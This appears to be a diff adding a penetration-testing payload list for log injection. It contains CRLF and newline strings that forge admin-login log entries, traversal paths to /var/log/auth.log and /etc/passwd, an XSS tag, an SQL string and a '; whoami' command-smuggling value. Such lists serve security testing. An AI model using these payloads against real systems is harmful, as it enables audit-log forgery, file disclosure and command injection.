@@ -1,0 +1,51 @@
+# Log Injection Payloads
+
+# CRLF injection in logs
+\r\n
+\r\nUser: admin logged in successfully
+%0d%0a
+%0d%0aAuthentication successful for admin
+
+# Log poisoning
+\nuser=admin authenticated=true\n
+\r\nSUCCESS: Admin login\r\n
+%0auser:admin%0astatus:success%0a
+
+# Log format manipulation
+admin\nAuthenticated:true
+test\r\nRole:administrator
+
+# Time-based log injection
+[2023-01-01 00:00:00] User admin logged in successfully
+[CRITICAL] Unauthorized access detected
+
+# Null byte injection in logs
+admin\x00
+user\x00admin
+
+# ANSI escape sequences (log injection)
+\x1b[31mCRITICAL\x1b[0m
+\033[1;31mALERT\033[0m
+
+# Log file path traversal
+../../logs/application.log
+/var/log/auth.log
+../../../var/log/syslog
+
+# Events to test if they appear in logs
+# Try these payloads and verify they are logged appropriately:
+# - Failed login attempts
+# - Successful login
+# - Password changes
+# - Privilege escalation attempts
+# - Administrative actions
+# - Access to sensitive data
+# - Invalid input
+# - Authentication failures
+# - Authorization failures
+
+# Sample payloads to check logging behavior
+SELECT * FROM users WHERE username='admin' AND password='wrong'
+<script>alert('XSS')</script>
+../../../etc/passwd
+; whoami
